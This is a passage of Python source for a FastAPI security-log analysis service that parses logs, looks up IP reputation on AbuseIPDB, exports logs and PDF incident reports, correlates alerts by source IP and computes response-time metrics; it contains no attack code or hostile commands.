        if trailing_content:
            # A trailing field carries real content — this is exactly the case
            # where attackers hide payloads in the referrer/UA/extra position.
            # Include it so downstream ML analysis actually sees it, instead
            # of silently truncating at the HTTP status/size fields.
            result["payload"] = base_payload + " | " + " | ".join(trailing_content)
        else:
            result["payload"] = base_payload
        return result

    # 3. Fallback: best-effort generic extraction (syslog-style free text)
    result["format_detected"] = "Generic / Syslog Text"
    ip_match = IP_REGEX.search(raw)
    if ip_match:
        result["ip"] = ip_match.group(0)
    ts_match = re.search(
        r"\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}|\d{1,2}/[A-Za-z]{3}/\d{4}:\d{2}:\d{2}:\d{2}", raw
    )
    if ts_match:
        result["timestamp"] = ts_match.group(0)
    user_match = re.search(r"\buser[=:]\s*([\w.@-]+)", raw, re.IGNORECASE)
    if user_match:
        result["user"] = user_match.group(1)
    return result


def _flatten_json(obj, prefix=""):
    """Flattens nested JSON into a single-level dict of key->value for lookup."""
    flat = {}
    if isinstance(obj, dict):
        for k, v in obj.items():
            full_key = k
            if isinstance(v, (dict, list)):
                flat.update(_flatten_json(v, full_key))
            else:
                flat[full_key] = v
    elif isinstance(obj, list):
        for item in obj:
            if isinstance(item, dict):
                flat.update(_flatten_json(item, prefix))
    return flat


# ---------------------------------------------------------------------------
# LIVE THREAT INTELLIGENCE — real AbuseIPDB lookup (free tier: 1,000/day)
# ---------------------------------------------------------------------------

@app.get("/threat-intel/{ip}")
def threat_intel_lookup(ip: str):
    if not is_valid_ip(ip):
        raise HTTPException(status_code=400, detail="Not a valid IPv4/IPv6 address.")

    if not ABUSEIPDB_API_KEY:
        raise HTTPException(
            status_code=503,
            detail=(
                "AbuseIPDB API key not configured. Get a free key at "
                "https://www.abuseipdb.com/register and add it to your .env file "
                "as ABUSEIPDB_API_KEY, then restart the server."
            ),
        )

    try:
        resp = requests.get(
            "https://api.abuseipdb.com/api/v2/check",
            headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
            params={"ipAddress": ip, "maxAgeInDays": 90},
            timeout=8,
        )
    except requests.RequestException as e:
        raise HTTPException(status_code=502, detail=f"Could not reach AbuseIPDB: {e}")

    if resp.status_code == 401:
        raise HTTPException(status_code=401, detail="AbuseIPDB rejected the API key. Check your .env file.")
    if resp.status_code != 200:
        raise HTTPException(status_code=502, detail=f"AbuseIPDB returned HTTP {resp.status_code}.")

    data = resp.json().get("data", {})
    return {
        "ip": data.get("ipAddress"),
        "abuse_confidence_score": data.get("abuseConfidenceScore"),
        "country": data.get("countryCode"),
        "isp": data.get("isp"),
        "domain": data.get("domain"),
        "usage_type": data.get("usageType"),
        "total_reports": data.get("totalReports"),
        "is_whitelisted": data.get("isWhitelisted"),
        "last_reported_at": data.get("lastReportedAt"),
    }


# ---------------------------------------------------------------------------
# EXPORTS — CSV / JSON bulk export, PDF forensic report
# ---------------------------------------------------------------------------

@app.get("/logs/export/csv")
def export_logs_csv():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM security_logs ORDER BY id DESC")
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()

    buffer = io.StringIO()
    fieldnames = ["id", "payload", "verdict", "risk_score", "severity", "category",
                  "summary", "recommended_action", "status", "created_at"]
    writer = csv.DictWriter(buffer, fieldnames=fieldnames)
    writer.writeheader()
    for row in rows:
        writer.writerow({k: row.get(k, "") for k in fieldnames})
    buffer.seek(0)

    filename = f"amidatabroke_logs_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.csv"
    return StreamingResponse(
        iter([buffer.getvalue()]),
        media_type="text/csv",
        headers={"Content-Disposition": f"attachment; filename={filename}"},
    )


@app.get("/logs/export/json")
def export_logs_json():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM security_logs ORDER BY id DESC")
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()

    payload = json.dumps(rows, indent=2)
    filename = f"amidatabroke_logs_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
    return StreamingResponse(
        iter([payload]),
        media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename={filename}"},
    )


@app.get("/logs/{log_id}/report")
def export_forensic_report(log_id: int):
    """Generates a real PDF incident report from live application state using ReportLab."""
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM security_logs WHERE id = ?", (log_id,))
    row = cur.fetchone()
    conn.close()
    if not row:
        raise HTTPException(status_code=404, detail="Log entry not found.")
    log = dict(row)

    buffer = io.BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter, topMargin=0.6 * inch, bottomMargin=0.6 * inch)
    styles = getSampleStyleSheet()
    title_style = ParagraphStyle("TitleX", parent=styles["Title"], textColor=colors.HexColor("#111111"))
    heading_style = ParagraphStyle("HeadingX", parent=styles["Heading2"], textColor=colors.HexColor("#1a1a1a"),
                                    spaceBefore=14, spaceAfter=6)
    body_style = ParagraphStyle("BodyX", parent=styles["Normal"], fontSize=10, leading=14)
    mono_style = ParagraphStyle("MonoX", parent=styles["Normal"], fontName="Courier", fontSize=9,
                                 backColor=colors.HexColor("#f2f2f2"), borderPadding=6, leading=12)

    sev_colors = {
        "Low": colors.HexColor("#b58900"), "Medium": colors.HexColor("#cb4b16"),
        "High": colors.HexColor("#dc322f"), "Critical": colors.HexColor("#990000"),
    }

    elements = []
    elements.append(Paragraph("AmIDataBroke — Forensic Incident Report", title_style))
    elements.append(Paragraph(f"Generated: {datetime.utcnow().isoformat()} UTC", body_style))
    elements.append(HRFlowable(width="100%", color=colors.HexColor("#cccccc"), spaceBefore=10, spaceAfter=10))

    summary_table_data = [
        ["Record ID", str(log["id"])],
        ["Verdict", log["verdict"]],
        ["Risk Score", f'{log["risk_score"]}%'],
        ["Severity", log["severity"]],
        ["Category", log["category"]],
        ["Status", log["status"]],
        ["Discovered At (UTC)", log["created_at"]],
    ]
    t = Table(summary_table_data, colWidths=[1.8 * inch, 4.2 * inch])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (0, -1), colors.HexColor("#eeeeee")),
        ("TEXTCOLOR", (1, 1), (1, 1), sev_colors.get(log["severity"], colors.black)),
        ("FONTNAME", (0, 0), (0, -1), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 10),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#cccccc")),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
    ]))
    elements.append(t)

    elements.append(Paragraph("Raw Payload", heading_style))
    elements.append(Paragraph(log["payload"].replace("<", "&lt;").replace(">", "&gt;"), mono_style))

    elements.append(Paragraph("AI Technical Explanation", heading_style))
    elements.append(Paragraph(log["summary"], body_style))

    elements.append(Paragraph("Recommended Mitigation Steps", heading_style))
    elements.append(Paragraph(log["recommended_action"], body_style))

    elements.append(Spacer(1, 24))
    elements.append(HRFlowable(width="100%", color=colors.HexColor("#cccccc")))
    elements.append(Paragraph(
        "This report was generated automatically by AmIDataBroke's detection engine "
        "(TF-IDF + Logistic Regression) and signature-based enrichment layer. "
        "Findings should be validated by an analyst before action is taken on production systems.",
        ParagraphStyle("Footer", parent=styles["Normal"], fontSize=8, textColor=colors.grey, spaceBefore=10),
    ))

    doc.build(elements)
    buffer.seek(0)
    filename = f"incident_report_{log_id}.pdf"
    return StreamingResponse(
        buffer,
        media_type="application/pdf",
        headers={"Content-Disposition": f"attachment; filename={filename}"},
    )


# ---------------------------------------------------------------------------
# CROSS-MODULE THREAT CORRELATION
# Groups stored logs by source IP and asks: does the PATTERN across multiple
# entries reveal something a single isolated alert would not? This is the
# same concept real SIEM correlation engines (Splunk, Sentinel) implement —
# distinct from analyzing one log line in isolation.
# ---------------------------------------------------------------------------

@app.get("/correlation")
def get_correlation():
    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        "SELECT * FROM security_logs WHERE source_ip IS NOT NULL AND source_ip != '' ORDER BY id ASC"
    )
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()

    groups = {}
    for row in rows:
        ip = row["source_ip"]
        groups.setdefault(ip, []).append(row)

    results = []
    for ip, entries in groups.items():
        categories = sorted({e["category"] for e in entries if e["category"] != "Benign"})
        techniques = sorted({e["mitre_technique"] for e in entries if e["mitre_technique"]})
        risk_scores = [e["risk_score"] for e in entries]
        avg_risk = round(sum(risk_scores) / len(risk_scores), 2)
        max_risk = max(risk_scores)
        malicious_count = sum(1 for e in entries if e["verdict"] == "Malicious")

        # --- Correlation scoring: combine frequency + diversity of attack types ---
        # This score is a NEW, separate field — it never overwrites each log's own
        # ML risk_score. It only reflects the pattern across multiple log entries.
        correlated_priority_score = avg_risk
        reasons = []

        if malicious_count >= 2:
            correlated_priority_score += 15
            reasons.append(f"{malicious_count} malicious events from the same IP")

        if len(categories) >= 2:
            correlated_priority_score += 20
            reasons.append(f"{len(categories)} distinct attack types observed ({', '.join(categories)})")

        if len(entries) >= 3:
            correlated_priority_score += 10
            reasons.append(f"{len(entries)} total events recorded from this source")

        # --- Live cross-module enrichment: pull in AbuseIPDB reputation, if configured ---
        abuse_score = None
        usage_type = None
        is_tor_or_proxy = False
        if ABUSEIPDB_API_KEY and is_valid_ip(ip):
            try:
                resp = requests.get(
                    "https://api.abuseipdb.com/api/v2/check",
                    headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
                    params={"ipAddress": ip, "maxAgeInDays": 90},
                    timeout=5,
                )
                if resp.status_code == 200:
                    data = resp.json().get("data", {})
                    abuse_score = data.get("abuseConfidenceScore")
                    usage_type = data.get("usageType")
                    if usage_type and ("tor" in usage_type.lower() or "proxy" in usage_type.lower() or "vpn" in usage_type.lower()):
                        is_tor_or_proxy = True
                        techniques = sorted(set(techniques) | {TOR_PROXY_TECHNIQUE})
                    if abuse_score and abuse_score >= 50:
                        correlated_priority_score += 25
                        reasons.append(f"IP has a {abuse_score}% AbuseIPDB reputation score")
            except requests.RequestException:
                pass  # Threat intel enrichment is best-effort; correlation still works without it

        correlated_priority_score = min(round(correlated_priority_score, 2), 100)

        results.append({
            "ip": ip,
            "log_count": len(entries),
            "malicious_count": malicious_count,
            "categories": categories,
            "mitre_techniques": techniques,
            "avg_risk_score": avg_risk,
            "max_risk_score": max_risk,
            "abuse_confidence_score": abuse_score,
            "usage_type": usage_type,
            "is_tor_or_proxy": is_tor_or_proxy,
            "correlated_priority_score": correlated_priority_score,
            "escalated": len(reasons) > 0,
            "reasons": reasons,
            "log_ids": [e["id"] for e in entries],
        })

    results.sort(key=lambda r: r["correlated_priority_score"], reverse=True)
    return results


# ---------------------------------------------------------------------------
# METRICS
# ---------------------------------------------------------------------------

@app.get("/metrics")
def get_metrics():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) AS total FROM security_logs")
    total = cur.fetchone()["total"]
    cur.execute("SELECT COUNT(*) AS malicious FROM security_logs WHERE verdict = 'Malicious'")
    malicious = cur.fetchone()["malicious"]
    cur.execute("SELECT COUNT(*) AS safe FROM security_logs WHERE verdict = 'Safe'")
    safe = cur.fetchone()["safe"]

    # --- MTTA / MTTR: computed from real captured timestamps, not simulated ---
    # MTTD is intentionally not reported as a fabricated duration: detection in
    # this system is synchronous with log submission (the ML model scores the
    # payload immediately on arrival), so there is no real "time to detect" gap
    # to measure — reporting a made-up number would be dishonest.
    def avg_seconds_between(start_col, end_col):
        cur.execute(
            f"SELECT created_at, {end_col} FROM security_logs "
            f"WHERE {end_col} IS NOT NULL AND {end_col} != ''"
        )
        rows = cur.fetchall()
        if not rows:
            return None, 0
        deltas = []
        for r in rows:
            try:
                start = datetime.fromisoformat(r["created_at"])
                end = datetime.fromisoformat(r[end_col])
                deltas.append((end - start).total_seconds())
            except (ValueError, TypeError):
                continue
        if not deltas:
            return None, 0
        return round(sum(deltas) / len(deltas), 1), len(deltas)

    mtta_seconds, mtta_sample_size = avg_seconds_between("created_at", "investigating_at")
    mttr_seconds, mttr_sample_size = avg_seconds_between("created_at", "resolved_at")

    conn.close()

    threat_ratio = round((malicious / total) * 100, 2) if total > 0 else 0.0
    return {
        "total": total,
        "malicious": malicious,
        "safe": safe,
        "threat_ratio": threat_ratio,
        "mtta_seconds": mtta_seconds,
        "mtta_sample_size": mtta_sample_size,
        "mttr_seconds": mttr_seconds,
        "mttr_sample_size": mttr_sample_size,
    }


@app.get("/")
def root():
    return {"status": "online", "service": "AmIDataBroke API"}